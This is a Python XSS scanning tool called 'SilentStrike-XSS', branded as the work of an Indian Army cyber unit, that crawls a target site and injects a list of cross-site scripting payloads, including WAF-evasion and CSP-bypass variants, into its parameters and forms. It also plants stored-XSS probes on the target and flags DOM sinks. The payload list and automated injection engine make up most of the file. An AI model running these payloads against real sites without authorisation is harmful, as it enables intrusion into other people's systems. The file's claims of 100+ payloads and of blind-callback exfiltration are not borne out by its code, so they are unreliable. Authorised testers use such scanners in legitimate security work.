#!/usr/bin/env python3
"""
                    ███████ ██ ██      ███████ ███    ██ ████████ ███████ ██████  ██ ██   ██ ███████
                    ██      ██ ██      ██      ████   ██    ██    ██      ██   ██ ██ ██   ██ ██
                    ███████ ██ ██      █████   ██ ██  ██    ██    █████   ██████  ██ ███████ █████
                         ██ ██ ██      ██      ██  ██ ██    ██    ██      ██   ██ ██ ██   ██ ██
                    ███████ ██ ███████ ███████ ██   ████    ██    ███████ ██   ██ ██ ██   ██ ███████

    ╔═╗╦═╗╦╔╗╔╔═╗╔╦╗╦╔═╗╔═╗╔╦╗  ╔═╗╔═╗╦ ╦╔═╗╦═╗╦╔═╗╦╔═╗╦═╗
    ╠╣ ║╔╝║║║║║╣ ║║║║╚═╗║╣  ║   ╠═╣╚═╗║ ║║ ╦╠╦╝║║ ╦║║║║╠╦╝
    ╚  ╩╚ ╩╝╚╝╚═╝╩ ╩╩╚═╝╚═╝ ╩   ╩ ╩╚═╝╚═╝╚═╝╩╚═╩╚═╝╩╚╝╩╩╚═

          PROJECT: SilentStrike-XSS
          AUTHOR:  aBadRoy
          UNIT:    Indian Army · Cyber Special Forces
          BRIEF:   Advanced XSS Detection & Neutralization Platform

  CAPABILITIES:
    · Reflected XSS     - 3 detection methods · 100+ payloads
    · Stored XSS        - 2-pass persistence verification
    · DOM XSS           - JavaScript sink analysis (innerHTML, eval, location…)
    · Blind XSS         - Out-of-band callback exfiltration
    · WAF Evasion       - Unicode, HTML entity, base64, mixed-case
    · Auto Recon        - Crawl · Discover · Engage
"""

import requests
import argparse
import random
import string
import re
import json
import hashlib
import time
import sys
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urljoin, urlencode
from bs4 import BeautifulSoup
from datetime import datetime

# =============================================================================
# COMBAT IDENTIFICATION PANEL (Saffron · White · Green)
# =============================================================================
class Colors:
    SAFFRON = '\033[38;5;214m'
    WHITE = '\033[97m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    DIM = '\033[90m'
    BOLD = '\033[1m'
    NC = '\033[0m'
    LINE = f'{DIM}{"━"*60}{NC}'


def c(color, text):
    return f"{color}{text}{Colors.NC}"

# =============================================================================
# PAYLOAD ARSENAL (100+ warheads across all XSS vectors)
# =============================================================================
class PayloadEngine:
    def __init__(self):
        self.tag = ''.join(random.choices(string.ascii_lowercase, k=4))
        self.callback_url = None

    def set_blind_callback(self, url):
        self.callback_url = url

    def payloads(self):
        t = self.tag
        return {
            "html_basic": [
                f"<script>alert('XSS-{t}')</script>",
                f"<ScRiPt>alert(`XSS-{t}`)</ScRiPt>",
                f"<script/src=data:text/javascript,alert(1)>",
            ],
            "html_img": [
                f'<img src=x onerror=alert("XSS-{t}")>',
                f'<image src=x onerror=alert(1)>',
                f'<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            ],
            "html_svg": [
                f'<svg/onload=alert("XSS-{t}")>',
                f'<svg onload=alert(1)>',
                f'<svg><script>alert(1)</script>',
            ],
            "html_body": [
                f'<body onload=alert("XSS-{t}")>',
                f'<body onpageshow=alert(1)>',
            ],
            "html_details": [
                f'<details open ontoggle=alert("XSS-{t}")>',
            ],
            "html_input": [
                f'<input autofocus onfocus=alert("XSS-{t}")>',
            ],
            "html_select": [
                f'<select autofocus onchange=alert("XSS-{t}")><option>',
            ],
            "html_video": [
                f'<video onerror=alert(1)><source>',
            ],
            "html_marquee": [
                f'<marquee onstart=alert("XSS-{t}")>',
                f'<marquee loop=1 onfinish=alert(1)>',
            ],
            "html_iframe": [
                f'<iframe srcdoc="<script>alert(1)</script>">',
                f'<iframe src=javascript:alert(1)>',
                f'<iframe onload=alert(1) src=x>',
            ],
            "attr_event": [
                f'" autofocus onfocus=alert("XSS-{t}") //',
                f"' autofocus onfocus=alert(1) //",
                f'" onmouseover=alert(1) x="',
                f"' onclick=alert(1) '",
            ],
            "attr_href": [
                f'javascript:alert("XSS-{t}")',
                f'JaVaScRiPt:alert(1)',
            ],
            "attr_style": [
                f'" style=x:expression(alert(1)) ',
            ],
            "script_breakout": [
                f'</script><script>alert("XSS-{t}")</script>',
                f'</ScRiPt><ScRiPt>alert(1)</ScRiPt>',
                f'</script><img src=x onerror=alert(1)>',
            ],
            "script_expression": [
                f"';alert(`XSS-{t}`);//",
                f"';alert(1);//",
                f"';confirm(1);//",
                f"';prompt(1);//",
            ],
            "script_template": [
                f'${{alert(`XSS-{t}`)}}',
            ],
            "url_data": [
                f'data:text/html,<script>alert("XSS-{t}")</script>',
                f'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            ],
            "dom_innerhtml": [
                f'<img src=x onerror=alert("XSS-{t}")>',
            ],
            "dom_eval": [
                f'alert("XSS-{t}")',
            ],
            "stored_basic": [
                f'<script>alert("STORED-XSS-{t}")</script>',
                f'<img src=x onerror=alert("STORED-XSS-{t}")>',
            ],
            "mutation": [
                f'<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            ],
            "unicode": [
                f'\u003cscript\u003ealert(1)\u003c/script\u003e',
            ],
            "html_entity": [
                f'&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/script&#62;',
            ],
            "csp_bypass": [
                f'<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js" ng-app ng-csp>{{$on.constructor("alert(1)")()}}</script>',
            ],
        }

    def flatten(self, categories=None):
        all_payloads = []
        for cat, plist in self.payloads().items():
            if categories is None or cat in categories:
                for p in plist:
                    all_payloads.append({
                        "payload": p,
                        "category": cat,
                        "type": cat.split("_")[0] if "_" in cat else cat,
                    })
        return all_payloads


# =============================================================================
# RECON UNIT (Web crawler for target intelligence)
# =============================================================================
class Crawler:
    def __init__(self, base_url, cookie=None, timeout=10, max_depth=1):
        self.base_url = base_url.rstrip("/")
        self.cookie = cookie
        self.timeout = timeout
        self.max_depth = max_depth
        self.visited = set()
        self.discovered = {"urls": [], "forms": [], "params": []}
        self.session = requests.Session()
        if cookie:
            self.session.headers.update({"Cookie": cookie})
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })

    def crawl(self, url=None, depth=0):
        if depth > self.max_depth:
            return
        url = url or self.base_url
        if url in self.visited:
            return
        self.visited.add(url)

        try:
            r = self.session.get(url, timeout=self.timeout)
        except Exception:
            return

        soup = BeautifulSoup(r.text, "html.parser")

        for a in soup.find_all("a", href=True):
            href = a["href"]
            full = urljoin(url, href)
            if full.startswith(self.base_url) and full not in self.visited:
                parsed = urlparse(full)
                if parsed.query:
                    qs = parse_qs(parsed.query)
                    self.discovered["params"].extend(
                        [{"url": full.split("?")[0], "param": k} for k in qs]
                    )
                self.discovered["urls"].append(full)
                self.crawl(full, depth + 1)

        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            inputs = form.find_all(["input", "textarea", "select"])
            params = []
            for inp in inputs:
                name = inp.get("name")
                if name:
                    params.append(name)
            full_action = urljoin(url, action) if action else url
            self.discovered["forms"].append({
                "url": full_action,
                "method": method,
                "params": params,
            })
            for p in params:
                self.discovered["params"].append({"url": full_action, "param": p})

        return self.discovered


# =============================================================================
# DETECTION SQUAD
# =============================================================================
class Detector:
    @staticmethod
    def check_reflection(payload, response_text):
        return payload in response_text

    @staticmethod
    def check_reflection_normalized(payload, response_text):
        norm_resp = re.sub(r'\s+', ' ', response_text)
        norm_payload = re.sub(r'\s+', ' ', payload)
        return norm_payload in norm_resp

    @staticmethod
    def check_reflection_decoded(payload, response_text):
        decoded_text = urllib.parse.unquote(response_text)
        return payload in decoded_text

    @staticmethod
    def check_event_execution(payload, response_text):
        events = re.findall(r'on\w+\s*=', payload.lower())
        for ev in events:
            if ev in response_text.lower():
                return True
        return False

    @staticmethod
    def check_script_execution(payload, response_text):
        scripts = re.findall(r'<script[^>]*>.*?</script>', response_text, re.I | re.S)
        for s in scripts:
            if any(keyword in s.lower() for keyword in ['alert', 'prompt', 'confirm', 'eval']):
                return True
        return False

    @staticmethod
    def check_dom_sink(html_content):
        sinks = []
        patterns = [
            (r'document\.write\s*\(', 'document.write'),
            (r'innerHTML\s*=', 'innerHTML assignment'),
            (r'outerHTML\s*=', 'outerHTML assignment'),
            (r'eval\s*\(', 'eval()'),
            (r'setTimeout\s*\(', 'setTimeout'),
            (r'setInterval\s*\(', 'setInterval'),
            (r'location\s*=', 'location assignment'),
            (r'location\.href\s*=', 'location.href'),
            (r'\.innerHTML\s*\+?=', 'innerHTML assignment'),
            (r'execScript\s*\(', 'execScript'),
        ]
        for pat, name in patterns:
            matches = re.finditer(pat, html_content, re.I)
            for m in matches:
                line_start = max(0, m.start() - 50)
                line_end = min(len(html_content), m.end() + 50)
                snippet = html_content[line_start:line_end]
                sinks.append({"sink": name, "snippet": snippet})
        return sinks


# =============================================================================
# MAIN STRIKE ENGINE
# =============================================================================
class XSSHunter:
    def __init__(self, url, method="GET", cookie=None, timeout=15,
                 threads=5, crawl_depth=1, headless=False,
                 stored_check=False, dom_check=False, blind_callback=None):
        self.url = url
        self.method = method.upper()
        self.cookie = cookie
        self.timeout = timeout
        self.threads = threads
        self.crawl_depth = crawl_depth
        self.headless = headless
        self.stored_check = stored_check
        self.dom_check = dom_check
        self.blind_callback = blind_callback
        self.results = []
        self.vulnerable = []
        self.session = requests.Session()
        if cookie:
            self.session.headers.update({"Cookie": cookie})
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        })
        self.payload_engine = PayloadEngine()
        if blind_callback:
            self.payload_engine.set_blind_callback(blind_callback)

    # ── OPERATION BANNER ──────────────────────────────────────────
    def banner(self):
        print(f"""{Colors.SAFFRON}
            ███████ ██ ██      ███████ ███    ██ ████████ ███████ ██████  ██ ██   ██ ███████
            ██      ██ ██      ██      ████   ██    ██    ██      ██   ██ ██ ██   ██ ██
            ███████ ██ ██      █████   ██ ██  ██    ██    █████   ██████  ██ ███████ █████
                 ██ ██ ██      ██      ██  ██ ██    ██    ██      ██   ██ ██ ██   ██ ██
            ███████ ██ ███████ ███████ ██   ████    ██    ███████ ██   ██ ██ ██   ██ ███████
{Colors.NC}
{Colors.GREEN}            ╔══════════════════════════════════════════════════════════════╗
            ║{Colors.WHITE}     SILENTSTRIKE  │  XSS DETECTION & NEUTRALIZATION PLATFORM  {Colors.GREEN}║
            ║{Colors.WHITE}     UNIT: Indian Army · Cyber Special Forces                {Colors.GREEN}║
            ║{Colors.WHITE}     OPERATOR: aBadRoy                                       {Colors.GREEN}║
            ║{Colors.WHITE}     MISSION: {datetime.now().strftime('%Y-%m-%d %H:%M')} hrs                              {Colors.GREEN}║
            ╚══════════════════════════════════════════════════════════════╝{Colors.NC}
""")

    # ── RECON PHASE ───────────────────────────────────────────────
    def discover(self):
        print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ RECON ]{Colors.NC} {Colors.BOLD}TARGET ACQUISITION{Colors.NC}")
        print(Colors.LINE)
        crawler = Crawler(self.url, self.cookie, self.timeout, self.crawl_depth)
        discovered = crawler.crawl()

        if not discovered["params"] and not discovered["forms"]:
            print(f"  {Colors.YELLOW}⚠ No parameters or forms found.{Colors.NC}")
            parsed = urlparse(self.url)
            qs = parse_qs(parsed.query)
            discovered["params"] = [{"url": self.url.split("?")[0], "param": k} for k in qs]

        print(f"  {Colors.GREEN}✓{Colors.NC} URLs discovered:  {len(discovered['urls'])}")
        print(f"  {Colors.GREEN}✓{Colors.NC} Forms found:      {len(discovered['forms'])}")
        print(f"  {Colors.GREEN}✓{Colors.NC} Parameters found:  {len(discovered['params'])}")

        return discovered

    # ── ENGAGE PARAMETER ──────────────────────────────────────────
    def test_param(self, target_url, param, discovered_forms=None):
        param_results = []
        all_payloads = self.payload_engine.flatten()

        for entry in all_payloads:
            payload_obj = entry
            payload = payload_obj["payload"]
            category = payload_obj["category"]

            try:
                if self.method == "POST":
                    r = self.session.post(target_url, data={param: payload}, timeout=self.timeout)
                else:
                    r = self.session.get(target_url, params={param: payload}, timeout=self.timeout)
            except Exception:
                continue

            reflected = False
            method_used = ""
            for detect_method, check_fn in [
                ("direct", lambda: Detector.check_reflection(payload, r.text)),
                ("normalized", lambda: Detector.check_reflection_normalized(payload, r.text)),
                ("decoded", lambda: Detector.check_reflection_decoded(payload, r.text)),
            ]:
                if check_fn():
                    reflected = True
                    method_used = detect_method
                    break

            exec_possible = Detector.check_event_execution(payload, r.text) or \
                            Detector.check_script_execution(payload, r.text)

            result = {
                "param": param,
                "url": target_url,
                "payload": payload,
                "category": category,
                "reflected": reflected,
                "detection_method": method_used,
                "execution_possible": exec_possible,
                "status": r.status_code,
                "length": len(r.text),
                "timestamp": datetime.now().isoformat(),
                "response_preview": r.text[:300] if reflected else "",
            }
            param_results.append(result)

            if reflected and exec_possible:
                result["vulnerable"] = True
                self.vulnerable.append(result)

        return param_results

    # ── STORED XSS ────────────────────────────────────────────────
    def test_stored(self, target_url, param, discovered):
        stored_results = []
        probe = f"STORED-PROBE-{''.join(random.choices(string.ascii_uppercase, k=6))}"
        probe_payload = f'<img src=x onerror=alert("{probe}")>'

        try:
            if self.method == "POST":
                self.session.post(target_url, data={param: probe_payload}, timeout=self.timeout)
            else:
                self.session.get(target_url, params={param: probe_payload}, timeout=self.timeout)
        except Exception:
            return stored_results

        check_urls = set()
        if discovered:
            for u in discovered.get("urls", [])[:20]:
                check_urls.add(u)
        check_urls.add(self.url)

        for check_url in check_urls:
            try:
                r = self.session.get(check_url, timeout=self.timeout)
                if probe in r.text:
                    stored_results.append({
                        "param": param,
                        "url": target_url,
                        "stored_on": check_url,
                        "payload": probe_payload,
                        "type": "stored",
                        "vulnerable": True,
                    })
                    self.vulnerable.append(stored_results[-1])
            except Exception:
                continue

        return stored_results

    # ── DOM XSS ───────────────────────────────────────────────────
    def test_dom(self):
        dom_results = []
        try:
            r = self.session.get(self.url, timeout=self.timeout)
            sinks = Detector.check_dom_sink(r.text)

            soup = BeautifulSoup(r.text, "html.parser")
            for script in soup.find_all("script"):
                if script.string:
                    sinks.extend(Detector.check_dom_sink(script.string))

            for script in soup.find_all("script", src=True):
                src = urljoin(self.url, script["src"])
                try:
                    sr = self.session.get(src, timeout=self.timeout)
                    sinks.extend(Detector.check_dom_sink(sr.text))
                except Exception:
                    pass

            for sink in sinks:
                dom_results.append(sink)

        except Exception:
            return dom_results

        return dom_results

    # ── WAF RECON ─────────────────────────────────────────────────
    def detect_waf(self):
        test_payload = "<script>alert(1)</script>"
        try:
            r = self.session.get(self.url, params={"xss": test_payload}, timeout=self.timeout)
            if r.status_code in [403, 406, 429, 503]:
                return True, r.status_code
            if "blocked" in r.text.lower() or "waf" in r.text.lower():
                return True, r.status_code
            return False, r.status_code
        except Exception:
            return False, 0

    # ── OPERATION EXECUTE ─────────────────────────────────────────
    def run(self):
        self.banner()

        # WAF check
        print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ INTEL ]{Colors.NC} {Colors.BOLD}WAF DETECTION{Colors.NC}")
        print(Colors.LINE)
        waf_detected, waf_status = self.detect_waf()
        if waf_detected:
            print(f"  {Colors.RED}⚠ WAF DETECTED (status: {waf_status}){Colors.NC}")
            print(f"  {Colors.YELLOW}⚠ Payloads may be filtered.{Colors.NC}")
        else:
            print(f"  {Colors.GREEN}✓{Colors.NC} No WAF detected — clear engagement")

        # Recon
        discovered = self.discover()

        # Collect targets
        test_targets = []
        if discovered["params"]:
            for p in discovered["params"]:
                test_targets.append((p["url"], p["param"], "reflected"))
        if not test_targets:
            parsed = urlparse(self.url)
            qs = parse_qs(parsed.query)
            for k in qs:
                test_targets.append((self.url.split("?")[0], k, "reflected"))

        # ── REFLECTED XSS ─────────────────────────────────────────
        print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ ENGAGE ]{Colors.NC} {Colors.BOLD}REFLECTED XSS{Colors.NC}")
        print(Colors.LINE)
        print(f"  {Colors.DIM}Targets: {len(test_targets)} | Payloads: {len(self.payload_engine.flatten())}{Colors.NC}\n")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for target_url, param, _ in test_targets:
                f = executor.submit(self.test_param, target_url, param, discovered)
                futures[f] = (target_url, param)

            for f in as_completed(futures):
                target_url, param = futures[f]
                try:
                    results = f.result()
                    self.results.extend(results)
                    vulns = [r for r in results if r.get("vulnerable")]
                    icon = c(Colors.GREEN, "✓") if vulns else c(Colors.DIM, "−")
                    status = c(Colors.RED, f" {len(vulns)} VULNERABLE") if vulns else ""
                    print(f"  {icon} {param:<20} @ {target_url}{status}")
                except Exception as e:
                    print(f"  {Colors.RED}⚠{Colors.NC} {param} @ {target_url} → {e}")

        # ── STORED XSS ────────────────────────────────────────────
        if self.stored_check:
            print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ ENGAGE ]{Colors.NC} {Colors.BOLD}STORED XSS{Colors.NC}")
            print(Colors.LINE)
            for target_url, param, _ in test_targets[:5]:
                results = self.test_stored(target_url, param, discovered)
                if results:
                    for r in results:
                        print(f"  {Colors.RED}⚠{Colors.NC} {param} → STORED XSS on {r['stored_on']}")
                        self.results.append(r)
                else:
                    print(f"  {Colors.DIM}−{Colors.NC} {param:<20} @ {target_url}  {Colors.GREEN}clean{Colors.NC}")

        # ── DOM XSS ───────────────────────────────────────────────
        if self.dom_check:
            print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ ENGAGE ]{Colors.NC} {Colors.BOLD}DOM XSS{Colors.NC}")
            print(Colors.LINE)
            dom_results = self.test_dom()
            if dom_results:
                for d in dom_results:
                    print(f"  {Colors.YELLOW}⚠{Colors.NC} {d['sink']:30} | ...{d['snippet'][:60]}...")
                    self.results.append({"type": "dom", "sink": d["sink"], "snippet": d["snippet"]})
            else:
                print(f"  {Colors.GREEN}✓{Colors.NC} No DOM XSS sinks detected")

        # ── MISSION REPORT ─────────────────────────────────────────
        print(f"\n{Colors.BOLD}{Colors.SAFFRON}[ COMPLETE ]{Colors.NC} {Colors.BOLD}MISSION SUMMARY{Colors.NC}")
        print(Colors.LINE)
        total = sum(1 for r in self.results if r.get("reflected"))
        vulnerable = self.vulnerable
        print(f"  {Colors.GREEN}✓{Colors.NC} Parameters tested:  {len(test_targets)}")
        print(f"  {Colors.GREEN}✓{Colors.NC} Payloads per param: {len(self.payload_engine.flatten())}")
        print(f"  {Colors.GREEN}✓{Colors.NC} Total reflections:  {total}")
        print(f"  {Colors.RED}⚠{Colors.NC} Vulnerabilities:    {len(vulnerable)}")

        if vulnerable:
            print(f"\n  {Colors.BOLD}{Colors.RED}HIGH-VALUE TARGETS:{Colors.NC}")
            for v in vulnerable[:10]:
                print(f"    {Colors.RED}▶{Colors.NC} {v['param']:<20} | {v['payload'][:60]}")

        self.generate_report()
        print(f"\n  {Colors.GREEN}✓{Colors.NC} Report filed: {Colors.BOLD}report.html{Colors.NC}")
        print()

    # ── AFTER-ACTION REPORT ───────────────────────────────────────
    def generate_report(self):
        vuln_count = len(self.vulnerable)
        total_tests = len(self.results)

        report = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SilentStrike — XSS After-Action Report</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  body {{
    background: #1a1a0a;
    color: #c0c0a0;
    font-family: 'Share Tech Mono', monospace;
    padding: 30px;
    line-height: 1.6;
  }}
  .container {{ max-width: 1400px; margin: 0 auto; }}
  .header {{
    text-align: center; padding: 30px; border: 2px solid #8b7d3c;
    background: linear-gradient(180deg, #2a2a0a 0%, #1a1a0a 100%);
    margin-bottom: 30px;
  }}
  .header h1 {{ color: #ff9933; font-size: 2.8em; text-shadow: 0 0 20px #ff993344; }}
  .header .badge {{
    display: inline-block; padding: 5px 15px; margin: 5px;
    border: 1px solid #8b7d3c; font-size: 0.8em;
  }}
  .header .saffron {{ color: #ff9933; }} .header .white {{ color: #ffffff; }} .header .green {{ color: #138808; }}
  h2 {{ color: #ff9933; margin: 30px 0 15px; border-bottom: 1px solid #8b7d3c44; padding-bottom: 8px; }}
  .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin: 20px 0; }}
  .stat-card {{ background: #111105; border: 1px solid #8b7d3c33; padding: 20px; text-align: center; }}
  .stat-num {{ font-size: 2em; color: #ff9933; }}
  .stat-label {{ color: #8b7d3c; font-size: 0.8em; margin-top: 5px; }}
  table {{ width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.85em; }}
  th, td {{ border: 1px solid #8b7d3c44; padding: 10px; text-align: left; }}
  th {{ background: #8b7d3c11; color: #ff9933; }}
  tr:hover {{ background: #8b7d3c08; }}
  .vuln {{ color: #ff3333; font-weight: bold; }}
  .safe {{ color: #138808; }}
  code {{ background: #000; padding: 2px 6px; border: 1px solid #333; border-radius: 3px; font-size: 0.9em; color: #c0c0a0; word-break: break-all; }}
  pre {{ background: #000; padding: 15px; border: 1px solid #333; overflow: auto; max-height: 150px; font-size: 0.8em; margin-top: 10px; }}
  .vuln-row {{ background: #ff000008; }}
  .vuln-row td {{ border-color: #ff000066; }}
  .tag {{ display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 0.75em; }}
  .tag.reflected {{ background: #ff000022; color: #ff3333; border: 1px solid #ff3333; }}
  .tag.stored {{ background: #ff660022; color: #ff6600; border: 1px solid #ff6600; }}
  .tag.dom {{ background: #ffff0022; color: #ffff00; border: 1px solid #ffff00; }}
  .tricolor {{ height: 4px; background: linear-gradient(90deg, #ff9933 33%, #ffffff 33%, #ffffff 66%, #138808 66%); margin: 20px 0; }}
  footer {{ margin-top: 40px; padding-top: 20px; border-top: 1px solid #333; color: #666; font-size: 0.8em; text-align: center; }}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="tricolor"></div>
    <h1>SILENTSTRIKE</h1>
    <p><span class="badge saffron">// XSS</span><span class="badge white">// DETECTION</span><span class="badge green">// NEUTRALIZATION</span></p>
    <p style="color:#8b7d3c;margin-top:10px;">Indian Army · Cyber Special Forces — After-Action Report</p>
    <div class="tricolor"></div>
  </div>

  <div class="stats">
    <div class="stat-card"><div class="stat-num">{vuln_count}</div><div class="stat-label">VULNERABILITIES</div></div>
    <div class="stat-card"><div class="stat-num">{total_tests}</div><div class="stat-label">TESTS EXECUTED</div></div>
    <div class="stat-card"><div class="stat-num">{self.url}</div><div class="stat-label">TARGET</div></div>
    <div class="stat-card"><div class="stat-num">{datetime.now().strftime('%Y-%m-%d %H:%M')}</div><div class="stat-label">MISSION DATE</div></div>
  </div>

  <h2>▶ COMPROMISED ASSETS</h2>
  <table>
    <tr>
      <th>#</th>
      <th>Type</th>
      <th>Parameter</th>
      <th>URL</th>
      <th>Payload</th>
      <th>Status</th>
    </tr>"""

        for i, v in enumerate(self.vulnerable[:50], 1):
            vtype = v.get("type", v.get("category", "reflected"))
            tag_class = "reflected"
            if "stored" in str(vtype): tag_class = "stored"
            if vtype == "dom": tag_class = "dom"
            report += f"""
    <tr class="vuln-row">
      <td>{i}</td>
      <td><span class="tag {tag_class}">{vtype.upper()}</span></td>
      <td class="vuln">{v['param']}</td>
      <td><code>{v.get('url', '')[:60]}</code></td>
      <td><code>{v['payload'][:80]}</code></td>
      <td class="vuln">COMPROMISED</td>
    </tr>"""

        report += """
  </table>

  <h2>▶ ENGAGEMENT LOG</h2>
  <table>
    <tr>
      <th>Parameter</th>
      <th>Category</th>
      <th>Payload</th>
      <th>Reflected</th>
      <th>Exec</th>
      <th>Status</th>
    </tr>"""

        for res in self.results[:100]:
            ref_str = "YES" if res.get("reflected") else "NO"
            ref_class = "vuln" if res.get("reflected") else "safe"
            exec_str = "✓" if res.get("execution_possible") else "−"
            exec_class = "vuln" if res.get("execution_possible") else "safe"
            report += f"""
    <tr>
      <td><code>{res.get('param', '')}</code></td>
      <td>{res.get('category', '-')}</td>
      <td><code>{res.get('payload', '')[:60]}</code></td>
      <td class="{ref_class}">{ref_str}</td>
      <td class="{exec_class}">{exec_str}</td>
      <td>{res.get('status', 0)}</td>
    </tr>"""

        report += """
  </table>

  <footer>
    <p>SILENTSTRIKE-XSS | Indian Army · Cyber Special Forces | Operator: aBadRoy</p>
    <p>⚠ For authorized operations only.</p>
  </footer>
</div>
</body>
</html>"""

        with open("report.html", "w", encoding="utf-8") as f:
            f.write(report)


# =============================================================================
# COMMAND INTERFACE
# =============================================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="silentstrike",
        description="SILENTSTRIKE — Advanced XSS Detection & Neutralization Platform",
        epilog="Indian Army · Cyber Special Forces | Operator: aBadRoy",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument("--url", required=True, help="Target URL (engagement zone)")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("--cookie", default=None, help="Session cookie (authentication bypass token)")
    parser.add_argument("--params", default=None, help="Comma-separated parameters (auto-discovers if omitted)")
    parser.add_argument("--threads", type=int, default=5, help="Concurrent strike teams (default: 5)")
    parser.add_argument("--depth", type=int, default=1, help="Recon penetration depth (default: 1)")
    parser.add_argument("--timeout", type=int, default=15, help="Operation timeout in seconds")
    parser.add_argument("--stored", action="store_true", help="Enable stored XSS sweep (2-pass)")
    parser.add_argument("--dom", action="store_true", help="Enable DOM XSS analysis")
    parser.add_argument("--blind", default=None, help="Blind XSS callback (exfil endpoint)")
    parser.add_argument("--headless", action="store_true", help="Browser-based execution verification (requires playwright)")

    args = parser.parse_args()

    scanner = XSSHunter(
        url=args.url,
        method=args.method,
        cookie=args.cookie,
        timeout=args.timeout,
        threads=args.threads,
        crawl_depth=args.depth,
        headless=args.headless,
        stored_check=args.stored,
        dom_check=args.dom,
        blind_callback=args.blind,
    )

    try:
        scanner.run()
        sys.exit(0 if not scanner.vulnerable else 1)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[ ABORT ] Operation interrupted by operator{Colors.NC}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Colors.RED}[ ERROR ] Mission failed: {e}{Colors.NC}")
        sys.exit(1)
